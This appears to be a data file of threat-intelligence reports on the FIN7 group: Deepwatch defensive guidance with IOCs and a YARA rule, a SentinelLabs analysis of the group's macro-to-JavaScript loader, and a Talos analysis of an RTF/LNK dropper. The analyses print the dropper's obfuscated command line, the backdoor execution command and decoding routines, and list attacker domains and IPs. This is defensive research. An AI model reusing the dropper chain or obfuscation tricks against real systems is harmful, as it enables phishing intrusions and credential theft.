executed as macros in the documents. Blocking macro execution and enabling verbose logging from PowerShell (although storage space is expensive) is an excellent start to defend against this group and others who favor sophisticated phishing attacks. Additionally, the usage of honey tokens in the environment can give a high-ﬁdelity alert regarding access. In the case of FIN7, string searches can detect user credentials to a database or a fake credit card number. Tracking known indicators based on the actor’s activity and setting alarms once IOCs are detected are also e""ective defense options. Many organizations are able to track the activity in their environment, but taking a more proactive stance is optimal. First and foremost it is imperative to know where critical data lies. In this case, PCI/DSS scoping can act as an initial point of reference, but knowing where card data and ﬁnancial data live can create a position of strength for https://www.deepwatch.com/labs/profile-of-an-adversary-fin7/ Pagina 5 di 16 Profile of an Adversary - FIN7 | Deepwatch 05/09/24, 17:14 defenders. Vulnerability management is also a critical piece to the holistic cyber defense. Though FIN7 does not actively exploit vulnerabilities at the time of this writing (e.g. CVE’s 2545, 1701, & 0199), they can potentially begin to do so in the future. Vulnerability Management allows you to take an in depth stock of your IT assets. TTPs posted by intelligence and research groups can help prioritize patches based on exploits available for the vulnerability. However, it is important to note that many adversaries gain access to an organization not via high and critical vulnerabilities, but by chaining together a number of vulnerabilities considered to have low and medium severity. Monitoring your systems for scheduled task changes is also critical. Be on the lookout for new scheduled tasks, especially those that use a .js ﬁle extension. If possible establish a host based detection for new ﬁles in the %appdata%\Roaming\Microsoft\Templates\ directory, particularly any with a .dot extension as well as new ﬁles in %appdata%\local\Storage\. Ensuring that your toolsets and conﬁgurations are set up properly can not only deter threats, but also cause problems for adversaries. Properly conﬁgured EDR, script blocking can prevent things like JavaScript or macros to deploy while OS hardening guidelines modeled after groups like NIST and CIS will also cause more issues for attackers than most tools. Finally, user education is a key component in every organization. Phishing is a highly used method for an initial foothold in organizations. According to Mimecast, 97% of breaches start with phishing. Until perfect phishing protection is created, users need to know how to recognize a malicious email, how to respond and what the company policies are for mitigating the risk. Good reporting can prevent a major campaign from being e""ective and can potentially cause a large portion of attacker infrastructure to be burned if reported correctly and responded to properly. Recap of Minimum Baseline Defenses Below is a recap of what should be considered minimum Enterprise defense and/or planning goals to reach ﬁrst. The higher the number below the greater the impact to https://www.deepwatch.com/labs/profile-of-an-adversary-fin7/ Pagina 6 di 16 Profile of an Adversary - FIN7 | Deepwatch 05/09/24, 17:14 defense, however there is typically a corresponding increase to the deployment lifecycle complexity. 1. Patch Relevant CVEs CVE-2015-2545 < https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015- 2545> CVE-2015-1701 < https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015- 1701> CVE-2017-0199 < https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017- 0199> 2. Log & Monitor on Enterprise Host Environment Task Scheduler jobs New Task Scheduler jobs %appdata%\Roaming\Microsoft\Templates\ %appdata%\local\Storage\ 3. Alert (& Groom) on the Monitored Enterprise Host Environment Task Scheduler jobs with .js extension New Task Scheduler jobs with .js extension %appdata%\Roaming\Microsoft\Templates\*.dot %appdata%\local\Storage\*.dot 4. Blocking macro execution in application userland with GPO 5. EDR JS and macro script blocking Conclusion In conclusion, FIN7 is an adversary worthy of concern with compromises resulting in the loss of up to a billion dollars. While this adversary is dangerous, basic security hygiene as outlined by both the NIST and CIS frameworks can reduce the actor’s https://www.deepwatch.com/labs/profile-of-an-adversary-fin7/ Pagina 7 di 16 Profile of an Adversary - FIN7 | Deepwatch 05/09/24, 17:14 e""ectiveness in your environment as well as reduce the mean time to detection and mitigation. Additionally, knowledge of the group’s tools, tactics, and processes allow defenders to more e""ectively predict the actions of the attacker, all of which can reduce your costs and the threats to your organization. This tipper, as of late April 2019, contains new TTPs and IOCs that are worth a review by members. Here is the summary of those: Mapping the speciﬁc new malware signatures Mapping the speciﬁc new domains Astra IOC in particular Two years ago, FIN7 uploaded their Carbanak Malware to VirusTotal containing over 100k Lines of Code (LoC) Indicators of Compromise (IoC) Indicator – Payload delivery Type – sha256 Signature – af60d8dfe30776b24823435b6e160d526ae500ce5583aee1ebbc909721d65120 Name – sqlRat Indicator – Network activity Type – ip-dst Signature – 31.18.219.133 Name – N/A Indicator – Payload delivery Type – sha256 Signature – 151a90d31f218b91053656aa61bcdbcc98d2009b31b90de76d74fb3b163bb420 Name – sqlRat Indicator – Network activity Type – ip-dst https://www.deepwatch.com/labs/profile-of-an-adversary-fin7/ Pagina 8 di 16 Profile of an Adversary - FIN7 | Deepwatch 05/09/24, 17:14 Signature – 185.117.89.134 Name – N/A Indicator – Payload delivery Type – sha256 Signature – fe8f6d366546c2e935cf01aae7233e12445f10b815b28702e739e6951475f687 Name – sqlRat Indicator – Payload delivery Type – sha256 Signature – d9ac4ef250a05ef8bd22c3227fd11df420cd663d5009b89a95466c1e0c301c1d Name – sqlRat Indicator – Payload delivery Type – sha256 Signature – 2296e672f49cc9f8802571970a58fe86f8fafaf841fc44fe5c73e291eaa55daa Name – sqlRat Indicator – Network activity Type – ip-dst Signature – 185.15.25.79 Name – N/A Indicator – Payload delivery Type – sha256 Signature – 5236ec183f819c5e5cbe3d7a1f8e5b3478b23cebacc5daa501f563e1971bace5 Name – sqlRat Indicator – Payload delivery Type – sha256 Signature – ee0cb9e6de83f807ccf9c3a02b384c1fb6e59f7de720f1eaf37141bf0487f5e6 https://www.deepwatch.com/labs/profile-of-an-adversary-fin7/ Pagina 9 di 16 Profile of an Adversary - FIN7 | Deepwatch 05/09/24, 17:14 Name – sqlRat Indicator – Network activity Type – ip-dst Signature – 185.66.68.9 Name – N/A Indicator – Payload delivery Type – sha256 Signature – 860a5e83c509ec6615a722cd62ba47a506f115743eeb03cc94b3d2b03cc0ecc0 Name – DNSRat Indicator – Network activity Type – ip-dst Signature – 5.10.40.54 Name – N/A Indicator – Payload delivery Type – sha256 Signature – 4c76e44d25c34620dc8cc019b96fd4da34d01fb4ac1e3b9f459c1ed6f80f05c4 Name – DNSRat Indicator – Payload delivery Type – sha256 Signature – 75a75224e81423663dd66ce20f845a58d523b0948c9d5cf135d599324512103e Name – DNSRat Indicator – Network activity Type – ip-dst Signature – 194.165.17.159 Name – N/A https://www.deepwatch.com/labs/profile-of-an-adversary-fin7/ Pagina 10 di 16 Profile of an Adversary - FIN7 | Deepwatch 05/09/24, 17:14 Indicator – Payload delivery Type – sha256 Signature – cfb152969e61e740fbb85c89239d3""6a319657d5fc28a971e0592604174f4e7 Name – DNSRat Indicator – Network activity Type – domain Signature – bigmoneyforus.com Name – N/A Indicator – Network activity Type – domain Signature – magicsoundmusic.com Name – N/A Indicator – Payload installation Type – sha256 Signature – 3622154e566f4f3c87c81f6757d94707a7c74b1133866f8e5ebf2568f878c10f Name – TiniMet Indicator – Payload installation Type – sha256 Signature – 2c73b87dbf21af4361b70b214b09cd92beb77ebcc6638be82b08e99fa564378a Name – TiniMet Indicator – Payload installation Type – sha256 Signature – 6ef59d0ef5922c79bcc447c05af95de84a29e09048e12167994085eda3107a99 Name – TiniMet Indicator – Payload installation https://www.deepwatch.com/labs/profile-of-an-adversary-fin7/ Pagina 11 di 16 Profile of an Adversary - FIN7 | Deepwatch 05/09/24, 17:14 Type – sha256 Signature – 1439d301d931c8c4b00717b9057b23f0eb50049916a48773b17397135194424a Name – TiniMet Indicator – Payload delivery Type – yara Signature – rule astra_docs { meta: description=ver1 of astra_docs"" author=""JDP"" strings: $header = {d0cf11e0a1b11ae1} $a1 = ""PROTECTED CONTENT"" ascii wide nocase $a11 = ""CONTROL"" ascii wide nocase $b1 = ""ConForm"" ascii wide $b2 = ""Reanimator Extreme Edition"" ascii wide nocase $b3 = ""Unlock document service."" ascii wide nocase $c1 = ""Image1_DblClick"" ascii wide nocase $c2 = ""img_click_DblClick"" ascii wide nocase $c3 = ""img_click"" ascii wide nocase $c4 = ""img_Click"" ascii wide nocase $c5 = ""Forms.Image.1"" condition: $header and all of ($a*) and 1 of ($b*) and 1 of ($c*) }"" Links https://www.deepwatch.com/labs/profile-of-an-adversary-fin7/ Pagina 12 di 16"
fin7,cti-hal,17e167f58321,G0046,"Search Subscribe Deep Insight into “FIN7” Malware Chain: From Office Macro Malware to Lightweight JS Loader - SentinelLabs 05/09/24, 11:02 (https://www.sentinelone.com/labs/) ADVANCED PERSISTENT THREAT (HTTPS://WWW.SENTINELONE.COM/LABS/CATEGORY/ADVANCED- PERSISTENT-THREAT/ ) Deep Insight into “FIN7” Malware Chain: From Office Macro Malware to Lightweight JS Loader VITALI KREMEZ (HTTPS://WWW.SENTINELONE.COM/BLOG/AUTHOR/VITALIK /) / 3, 2019 (HTTPS://WWW.SENTINELONE.COM/BLOG/2019/10/) OCTOBER Search ... S I G N U P S I G N U P S I G N U P S I G N U P Get notiﬁed when we post new content. Business Email > Vitali Kremez dissecting the ‘Fin7’ malware chain, which leverages malicious O""ce Macros and lightweight JS Loader R E C E N T P O S T S R E C E N T P O S T S R E C E N T P O S T S R E C E N T P O S T S scripts. https://www.sentinelone.com/labs/deep-insight-into-fin7-malware-chain-from-office-macro-malware-to-lightweight-js-loader/ Pagina 1 di 10 By clicking Subscribe, I agree to the use of mypersonal data in accordance with SentinelOne PrivacyNotice (/legal/privacy-notice/). SentinelOne will notsell, trade, lease, or rent your personal data to thirdparties. This site is protected by reCAPTCHA and theGoogle Privacy Policy(https://policies.google.com/privacy) and Terms ofService (https://policies.google.com/terms) apply. Deep Insight into “FIN7” Malware Chain: From Office Macro Malware to Lightweight JS Loader - SentinelLabs 05/09/24, 11:02 “FIN7” is a ﬁnancially motivated advanced persistent group (https://www.sentinelone.com/blog/what-are-advanced- targeted-attacks/) operating out of Eastern Europe. Since 2015, this group has continued to be extremely successful and formidable targeting various businesses seeking large-scale point-of-sale (https://www.sentinelone.com/blog/ﬁn6- frameworkpos-point-of-sale-malware-analysis-internals/) (PoS) compromises and network intrusion impacting global enterprises. The group is also known and notorious for its stealthy techniques and sophisticated and persistent approach. Global corporations impacted by the group are primarily part of the restaurant, gaming, and hospitality industries. Some of the victims of this group include such restaurant chains as Chipotle Mexican Grill, Chili’s, and Arby’s. Exploring the VirusTotal Dataset | An Analyst’s Guide to Effective Threat Research (https://www.sentinelone.com/labs/exploring- (https://www.sentinelone.com/labs/exploring- the- the-virustotal- virustotal- dataset-an- dataset-an- analysts-guide-to- analysts- effective-threat- guide-to- research/) e$ective- threat- research/) AUGUST 29, 2024 LABScon23 Replay | Black Magic – Influence Operations in the Open and At-Scale in Hungary (https://www.sentinelone.com/labs/labscon23- replay-black- magic-influence- operations-in-the- open-and-at-scale- in-hungary/) (https://www.sentinelone.com/labs/labscon23- replay-black- magic- inﬂuence- operations- in-the-open- and-at- scale-in- hungary/) AUGUST 21, 2024 Xeon Sender | SMS Spam Shipping Multi-Tool Targeting SaaS Credentials (https://www.sentinelone.com/labs/xeon- (https://www.sentinelone.com/labs/xeon- sender-sms- sender-sms-spam- spam- shipping-multi- shipping- tool-targeting- multi-tool- saas-credentials/) targeting- saas- credentials/) AUGUST 19, 2024 Source: DOJ L A B S C A T E G O R I E S L A B S C A T E G O R I E S L A B S C A T E G O R I E S L A B S C A T E G O R I E S Most interestingly, this group used a front company “Combi Security” (reportedly based in Russia and Israel) to recruit various hackers to join their activities. This front company allowed the group to sustain their hacking activities and truly professionalized their hacking approach. Despite the previous arrests of three members of the FIN7 group in January 2018, the group and/or its remnants still remained active on the ﬁnancial crime (https://www.sentinelone.com/blog/ecommerce-security-13- best-practices-to-prevent-threats/) landscape. Crimeware (https://www.sentinelone.com/labs/category/crimeware/) Security Research (https://www.sentinelone.com/labs/category/security- research/) Advanced Persistent Threat (https://www.sentinelone.com/labs/category/advanced- persistent-threat/) Adversary (https://www.sentinelone.com/labs/category/adversary/) LABScon (https://www.sentinelone.com/labs/category/labscon/) Security & Intelligence (https://www.sentinelone.com/labs/category/security- intelligence/) https://www.sentinelone.com/labs/deep-insight-into-fin7-malware-chain-from-office-macro-malware-to-lightweight-js-loader/ Pagina 2 di 10 Deep Insight into “FIN7” Malware Chain: From Office Macro Malware to Lightweight JS Loader - SentinelLabs 05/09/24, 11:02 Source: DOJ It is notable that the group still deploys lightweight JavaScript backdoor with communication over HTTPS mimicking Content Delivery Network (CDN) domains. Additionally, they still leverage JavaScript backdoor via renamed wscript.exe with the actual JavaScript code called “errors.txt,” for example. FIN7: From First-Stage Microsoft O""ce VBA Macro Loader to JS Loader The FIN7 Microsoft document loaders do not rely on any exploits but simply require a social engineering trick (https://www.sentinelone.com/blog/phishing-revealing- vulnerable-targets/) to “Enable Content” to activate macros. Notably, to avoid process whitelisting (https://www.sentinelone.com/blog/can-whitelisting-win- advanced-persistent-threats/) of wscript , the macro logic copies the original JavaScript execution engine wscript.exe in %LOCALAPPDATA% and leverages a possible anti-analysis routine of checking the system drive size via GetDrive.TotalSize of more than 2456 bytes to possibly thwart anti-sandbox check. https://www.sentinelone.com/labs/deep-insight-into-fin7-malware-chain-from-office-macro-malware-to-lightweight-js-loader/ Pagina 3 di 10 Deep Insight into “FIN7” Malware Chain: From Office Macro Malware to Lightweight JS Loader - SentinelLabs 05/09/24, 11:02 The actual obfuscated Javascript backdoor is stored in UserForm object, which is also written to a disc as “errors.txt” in %TEMP% . The ﬁnal execution of the backdoor is performed via this following command: %LOCALAPPDATA%mses.exe //b /e:jscript %temp%errors.txt Once it is done, the document macro (https://www.sentinelone.com/news/how-can-obfuscated- macro-malware-be-located-and-removed/) runs a message box displaying “Decryption error” via MsgBox(""Decryption error"") . Reversing Steps: 1. Extract the VBA macro via olevba (https://github.com/decalage2/oletools/wiki/olevba); https://www.sentinelone.com/labs/deep-insight-into-fin7-malware-chain-from-office-macro-malware-to-lightweight-js-loader/ Pagina 4 di 10 Deep Insight into “FIN7” Malware Chain: From Office Macro Malware to Lightweight JS Loader - SentinelLabs 05/09/24, 11:02 2. Debug in O""ce VBA to retrieve decoded script; 3. Extract and prettify obfuscated JavaScript backdoor from userform object; 4. Modify JS code close to eval() and run script via Internet Explorer debugger, for example; 5. Debug, extract and beautify the full FIN7 JS backdoor. FIN7 JS Loader/Backdoor XOR Encryption & Custom Encoding The crypt_controller function accepts two parameters of type and request. https://www.sentinelone.com/labs/deep-insight-into-fin7-malware-chain-from-office-macro-malware-to-lightweight-js-loader/ Pagina 5 di 10 Deep Insight into “FIN7” Malware Chain: From Office Macro Malware to Lightweight JS Loader - SentinelLabs 05/09/24, 11:02 a. If type parameter equals “decrypt”, the request is processed via decodeURIComponent splitting the request with separator "")*("" and then retrieving encryption_key(second element[1]) from split request. If there’s no encryption_key split, it pulls it as a random value via (Math.floor(Math.random() * 9000) + 1000).toString().split(""""); . The decoding routine is a simple XOR loop decoding the content as follows joining the result_string via .join command. var output = []; for (var i = 0; i < request.length; i++) { var charCode = request.charCodeAt(i) ^ encryption_key[i % encryption_key.length].charCodeAt(0); output.push(String.fromCharCode(charCode)); } b. If type parameter equals “encrypt”, the result_string is joined with "")*("" and passed to encodeURIComponent . FIN7 Second-Stage Machine & Network Proﬁling Script In the aftermath of the initial call, the group deploys a custom “proﬁling” script meant to ﬁngerprint the machine and the network environment more closely. The malware checks for the presence of virtual machine, queries active directory, operating system, screen resolution, user account control (UAC) level, and retrieves a process list. https://www.sentinelone.com/labs/deep-insight-into-fin7-malware-chain-from-office-macro-malware-to-lightweight-js-loader/ Pagina 6 di 10 Deep Insight into “FIN7” Malware Chain: From Office Macro Malware to Lightweight JS Loader - SentinelLabs 05/09/24, 11:02 Finally, it formats the data and appends to “action=add_info” request, which is sent to the server. Indicators of Compromise (IOCs): Microsoft O!ce First-Stage VBA Macro “.doc” Microsoft O!ce First-Stage VBA Macro “.doc” Microsoft O!ce First-Stage VBA Macro “.doc” Microsoft O!ce First-Stage VBA Macro “.doc” Documents: Documents: Documents: Documents: SHA256: 6e1230088a34678726102353c622445e1f8b8b8c9ce1f025d11bff fd5017ca82 SHA256: f5f8ab9863dc12d04731b1932fc3609742de68252c706952f31894 fc21746bb8 SHA256: 63ff5d9c9b33512f0d9f8d153c02065c637b7da48d2c0b6f7114de ae6f6d88aa C2:C2:C2:C2: googleapi-cdn[.]com bing-cdn[.]com cisco-cdn[.]com Recent Microsoft O!ce First-Stage VBA Macro “.xlsb” Recent Microsoft O!ce First-Stage VBA Macro “.xlsb” Recent Microsoft O!ce First-Stage VBA Macro “.xlsb” Recent Microsoft O!ce First-Stage VBA Macro “.xlsb” Documents: Documents: Documents: Documents: SHA256: 5fa5970548b43ae7d93d758a1eef1f12fd76891e36538e3ac170d5 ab30906b5c SHA256: 60dfe419dcba6dfe16d24f663b3393deeffdedbe4da468be63c63e c4b914d485 SHA256: 2ce1cfc137c0bcc82577cc77074c82154d81a7370491c85d43622a f5186ef058 Recent C2: Recent C2: Recent C2: Recent C2: realtek-cdn[.]com FIN7 (HTTPS://WWW.SENTINELONE.COM/BLOG/TAG/FIN7/) REVERSE ENGINEEERING (HTTPS://WWW.SENTINELONE.COM/BLOG/TAG/REVERSE- ENGINEEERING/) VITALI KREMEZ (HTTPS://WWW.SENTINELONE.COM/BLOG/TAG/VITALI-KREMEZ/) ZERO2HERO (HTTPS://WWW.SENTINELONE.COM/BLOG/TAG/ZERO2HERO/) https://www.sentinelone.com/labs/deep-insight-into-fin7-malware-chain-from-office-macro-malware-to-lightweight-js-loader/ Pagina 7 di 10 Deep Insight into “FIN7” Malware Chain: From Office Macro Malware to Lightweight JS Loader - SentinelLabs 05/09/24, 11:02 S H A R E S H A R E S H A R E S H A R E (mailto:? (https://www.facebook.com/sharer.php? ((((https://www.sentinelone.com/wp- https://www.sentinelone.com/wp- https://www.sentinelone.com/wp- https://www.sentinelone.com/wp- (http://reddit.com/submit? (https://www.linkedin.com/shareArticle? content/uploads/pdf- content/uploads/pdf- content/uploads/pdf- content/uploads/pdf- u=https://www.sentinelone.com/labs/deep- mini=true&url=https://www.sentinelone.com/labs/deep- url=https://www.sentinelone.com/labs/deep- gen/1630596955/deep-insight- gen/1630596955/deep-insight- gen/1630596955/deep-insight- gen/1630596955/deep-insight- subject=Deep%20Insight%20into%20%E2%80%9CFIN7%E2%80%9D%20Malware%20Chain%3A%20From%20O""ce%20Macro%20Malware%20to%20Lightweight%20JS%20Loader&body=https%3A%2F%2Fwww.sentinelone.com%2Flabs%2Fdeep- insight-into-ﬁn7-malware-chain-from- into-ﬁn7-malware-chain-from- into-ﬁn7-malware-chain-from- into-ﬁn7-malware-chain-from- into-ﬁn7-malware-chain-from- insight-into-ﬁn7-malware-chain-from-o""ce- insight-into-ﬁn7-malware-chain-from-o""ce-macro- insight-into-ﬁn7-malware-chain-from-o""ce-macro-malware-to-lightweight-js-loader%2F) o""ce-macro-malware-to-lightweight-js- o""ce-macro-malware-to- o""ce-macro-malware-to- o""ce-macro-malware-to- o""ce-macro-malware-to- macro-malware-to-lightweight-js-loader/) malware-to-lightweight-js-loader/) lightweight-js-loader.pdf)))) lightweight-js-loader.pdf lightweight-js-loader.pdf lightweight-js-loader.pdf loader/) (https://twitter.com/intent/tweet?url=https://www.sentinelone.com/labs/deep-insight-into-ﬁn7-malware-chain-from-o""ce-macro-malware-to-lightweight-js- loader/&text=Deep%20Insight%20into%20%E2%80%9CFIN7%E2%80%9D%20Malware%20Chain%3A%20From%20O""ce%20Macro%20Malware%20to%20Lightweight%20JS%20Loader) PDFPDFPDFPDF https://www.sentinelone.com/blog/author/vitalik/)))) https://www.sentinelone.com/blog/author/vitalik/ https://www.sentinelone.com/blog/author/vitalik/ VITALI KREMEZ ((((https://www.sentinelone.com/blog/author/vitalik/ VITALI KREMEZ VITALI KREMEZ VITALI KREMEZ Vitali Kremez is a strategic advisor for SentinelLabs. He specializes in researching and investigating complex cyberattacks, network intrusions, data breaches, and hacking incidents mainly emanating from the Eastern European cybercriminal ecosystem. He has earned the majority of major certiﬁcations available in information technology, information security, and digital forensics ﬁelds. (https://www.vkremez.com/) (https://www.linkedin.com/in/vitali- kremez-021905104/) (https://twitter.com/vk_intel) PREV Info Stealers | How Info Stealers | How Info Stealers | How Info Stealers | How Malware Hacks Malware Hacks Malware Hacks Malware Hacks Private User Data Private User Data Private User Data Private User Data (https://www.sentinelone.com/labs/info- stealers-how-malware- hacks-private-user-data/) NEXT Writing Malware Writing Malware Writing Malware Writing Malware Conﬁguration Conﬁguration Conﬁguration Conﬁguration Extractors for Extractors for Extractors for Extractors for ISFB/Ursnif ISFB/Ursnif ISFB/Ursnif ISFB/Ursnif (https://www.sentinelone.com/labs/writing- malware-conﬁguration- extractors-for-isfb-ursnif/) R E L AT E D P O S T S R E L AT E D P O S T S R E L AT E D P O S T S R E L AT E D P O S T S ChamelGang & ChamelGang & ChamelGang & ChamelGang & Friends | Friends | Friends | Friends | Cyberespionage Cyberespionage Cyberespionage Cyberespionage Groups Attacking Groups Attacking Groups Attacking Groups Attacking Critical Critical Critical Critical Infrastructure Infrastructure Infrastructure Infrastructure with Ransomware with Ransomware with Ransomware with Ransomware https://www.sentinelone.com/labs/chamelgang- https://www.sentinelone.com/labs/chamelgang- https://www.sentinelone.com/labs/chamelgang- ((((https://www.sentinelone.com/labs/chamelgang- attacking- attacking- attacking- attacking- critical- critical- critical- critical- infrastructure- infrastructure- infrastructure- infrastructure- with-with-with-with- ransomware/)))) ransomware/ ransomware/ ransomware/ ScarCruft | ScarCruft | ScarCruft | ScarCruft | Unmasking I- Unmasking I- Unmasking I- Unmasking I- Attackers Gather Attackers Gather Attackers Gather Attackers Gather Soon | The Leak Soon | The Leak Soon | The Leak Soon | The Leak Strategic Strategic Strategic Strategic That Revealed That Revealed That Revealed That Revealed Intelligence and Intelligence and Intelligence and Intelligence and China’s Cyber China’s Cyber China’s Cyber China’s Cyber Target Target Target Target Operations Operations Operations Operations Cybersecurity Cybersecurity Cybersecurity Cybersecurity ((((https://www.sentinelone.com/labs/unmasking- https://www.sentinelone.com/labs/unmasking- https://www.sentinelone.com/labs/unmasking- https://www.sentinelone.com/labs/unmasking- Professionals Professionals Professionals Professionals i-soon-the-leak- i-soon-the-leak- i-soon-the-leak- i-soon-the-leak- https://www.sentinelone.com/labs/a- https://www.sentinelone.com/labs/a- https://www.sentinelone.com/labs/a- ((((https://www.sentinelone.com/labs/a- that-revealed- that-revealed- that-revealed- that-revealed- glimpse-into- glimpse-into- glimpse-into- glimpse-into- chinas-cyber- chinas-cyber- chinas-cyber- chinas-cyber- future-scarcruft- future-scarcruft- future-scarcruft- future-scarcruft- operations/)))) operations/ operations/ operations/ campaigns- campaigns- campaigns- campaigns- attackers- attackers- attackers- attackers- gather-strategic- gather-strategic- gather-strategic- gather-strategic- intelligence-and- intelligence-and- intelligence-and- intelligence-and- target- target- target- target- cybersecurity- cybersecurity- cybersecurity- cybersecurity- professionals/)))) professionals/ professionals/ professionals/ FEBRUARY 21 2024 JUNE 26 2024 JANUARY 22 2024 https://www.sentinelone.com/labs/deep-insight-into-fin7-malware-chain-from-office-macro-malware-to-lightweight-js-loader/ Pagina 8 di 10"
fin7,cti-hal,a124076be477,G0046,"FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks 07/09/24, 12:51 Intelligence Center Vulnerability Research Incident Response Blog Support More bot.js Click Base64 Decodewith WScript task.xml 2 bot.js b64decode.js 5 unprotect.rtf.Ink %HOMEPATH%Imd5.txt(JS) b64decode.js stealer.dll Decode b64decode.js Wscript Write&Execute Injectin FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks By Edmund Brumaghin W E D N E S D AY, S E P T E M B E R 2 7 , 2 0 1 7 1 3 : 3 8 T H R E AT S This post was authored by Michael Gorelik and Josh Reynolds Executive Summary Throughout this blog post we will be detailing a newly discovered RTF document family that is being leveraged by the FIN7 group (also known as the Carbanak gang) which is a Knancially-motivated group targeting the Knancial, hospitality, and medical industries. This document is used in phishing campaigns to execute a series of scripting languages containing multiple obfuscation mechanisms and advanced techniques to bypass traditional security mechanisms. The document contains messages enticing the user to click on an embedded object that executes scripts which are used to infect the system with an information stealing malware variant. This malware is then used to steal passwords from popular browsers and mail clients which are sent to remote nodes that are https://blog.talosintelligence.com/fin7-stealer/#more Pagina 1 di 18 FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks 07/09/24, 12:51 accessible to the attackers. These advanced mechanisms and the information stealing malware will be discussed in detail. We will also review a number of static and dynamic detection mechanisms used in the AMP for Endpoints and Threat Grid product lines to detect these document families. Introduction On June 9th, 2017 Morphisec Labpublished a blog post detailing a new infection vector technique using an RTF document containing an embedded JavaScript OLE object. When clicked it launches an infection chain made up of JavaScript, and a Knal shellcode payload that makes use of DNS to load additional shellcode from a remote command and control server. In this collaboration post with Morphisec Lab and Cisco's Research and EZcacy Team, we are now publishing details of this new document variant that makes use of an LNK embedded OLE object, which extracts a JavaScript bot from a document object, and injects a stealer DLL in memory using PowerShell. The details we are releasing are to provide insight into attack methodologies being employed by sophisticated groups such as FIN7 who are consistently changing techniques between attacks to avoid detection, and to demonstrate the detection capabilities of the AMP for Endpoints and Threat Grid product lines. This is relevant to the constantly changing threats that are affecting multiple types of industries on a daily basis. Infection Vector The dropper variant that we encountered makes use of an LNK Kle to execute wscript.exe with the beginning of the JavaScript chain from a word document object: C:\Windows\System32\cmd.exe..\..\..\Windows\System32\cmd.exe /C set x=wsc@ript /e:js@cript %HOMEPATH%\md5.txt & echo try{w=GetObject("""",""Wor""+""d.Application"");this[String.fromCharCode(101)+'va'+'l'] (w.ActiveDocument.Shapes(1).TextFrame.TextRange.Text);}catch(e){}; >%HOMEPATH%\md5.txt & echo %x:@=%|cmd This chain involves a substantial amount of base64 encoded JavaScript =les that make up each component of the JavaScript bot. It also contains the reAective DLL injection PowerShell code to inject an information stealing malware variant DLL which will be discussed further. JavaScript Comparisons Clustering Decoded JavaScript Functionality A single one of these documents can produce as many as 40 JavaScript Dles. In order to identify similar techniques, we decided to use entropy of a given JavaScript Dle, and the base64 decoding depth to cluster Dles within a scatter plot with theggplot andggiraph R libraries. Before we demonstrate our analysis results, we will explain the values used for plotting and clustering of the JavaScript =les. https://blog.talosintelligence.com/fin7-stealer/#more Pagina 2 di 18 FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks 07/09/24, 12:51 Base64 Encodings The majority of the JavaScript obfuscation is nested base64 encodings. Base64 is a binary to text encoding scheme which can be used to represent any type of data. In the case of these documents it is used to encode JavaScript functionality multiple times, likely in order to avoid common analysis techniques employed by traditional anti-virus software which only emulate JavaScript instructions for a limited amount of iterations. The base64 blobs are hardcoded, or comma separated, which are then concatenated and decoded making up the next JavaScript code to be executed. It is decoded using an CDO.Message ActiveXObject invocation and specifying the ContentTransferEncoding to be base64 (note that the windows-1251 charset is Cyrillic, which may indicate Russian origin): function b64dec(data){ var cdo = new ActiveXObject(""CDO.Message""); var bp = cdo.BodyPart; bp.ContentTransferEncoding = ""base64""; bp.Charset = ""windows-1251""; var st = bp.GetEncodedContentStream(); st.WriteText(data); st.Flush(); st = bp.GetDecodedContentStream(); st.Charset = ""utf-8""; return st.ReadText; } This is then evaluated using an obfuscated function invocation, E.G: MyName.getGlct()[String.fromCharCode(101)+'va'+'l'](b64dec(energy)); These base64 decoding steps lead to various execution branches of JavaScript bot functionality, and the injection of a stealer DLL into memory: Figure 1: Detailed Document Infection Chain Using JavaScript and DLL Injection JavaScript Entropy Entropy involves the calculation of disorder and uncertainty within a given amount of data. In this case, we are interested in associating https://blog.talosintelligence.com/fin7-stealer/#more Pagina 3 di 18 FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks 07/09/24, 12:51 extracted JavaScript Dles based on this calculation, since variations of these documents contain similar functionality, but employed obfuscation mechanisms makes clustering them diZcult. We used the following calculation fromEro Carrera's blog in Python: import math def H(data): if not data: return 0 entropy = 0 for x in range(256): p_x = float(data.count(chr(x)))/len(data) if p_x > 0: entropy += - p_x*math.log(p_x, 2) return entropy This calculation is done for each JavaScript =le and is the X axis of our scatter plots that will be described in the next section. Scatter Plot for Clustering & JavaScript Functionality We began with an initial set of documents which did not contain a dropper DLL. We then calculated the amount of base64 decoding required to produce each Dle (Y axis) and calculated their respective entropy (X axis). We then reviewed each scatter plot grouping and labeled their respective functionality in red: Figure 2: Scatter plot using entropy and base64 decoding depth There are a number of conclusions from the scatter plot: 1. The higher depth of base64 decoding shows more interesting functionality (to be expected) 2. The bot functionality and C2 contact JavaScript is within multiple sets of =les at close decoding depths and entropy 3. The task scheduling functionality vary in depth and entropy (two separate cases) We then applied the same technique to the second generation of documents which ship an entire base64 encoded and compressed DLL: https://blog.talosintelligence.com/fin7-stealer/#more Pagina 4 di 18 FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks 07/09/24, 12:51 Figure 3: Scatter plot of PowerShell DLL documents The outliers are the decoded DLLs and XML task =les. When these components are removed from the scatter plot (leaving only JavaScript) we see similar clusters to the =rst generation of documents: Figure 4: ModiDed Plot of PowerShell DLL Documents Based on the number of clusters and range of entropy we see that this generation of documents contain more =les with varying functionality and depth. This plotting technique also provides a method of identifying new functionality by showing outliers, such as the labeled PS Outlier which contains an array of encoded PowerShell bytes rather than a blob that provides the =nal PowerShell for DLL injection: https://blog.talosintelligence.com/fin7-stealer/#more Pagina 5 di 18 FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks 07/09/24, 12:51 Figure 5: IdentiDed New PowerShell Functionality Due to Entropy Outlier JavaScript Obfuscation Changes Once similar functionality has been clustered, the changes made between generated documents become apparent. Variable names and GUID paths are changed: Figure 6: Variables and Path GUID JS Changes This functionality also highlights an interesting obfuscation mechanism that some emulation engines may ignore. The function body of the evaluated JavaScript appears to be within a multi-line comment, however, in reality this is evaluated as a multi-line string. This can be seen below when tested in Chrome's scripting console: Figure 7: JavaScript Multi-Line Comment String Obfuscation Functions are re-ordered: https://blog.talosintelligence.com/fin7-stealer/#more Pagina 6 di 18 FIN7 Group Uses 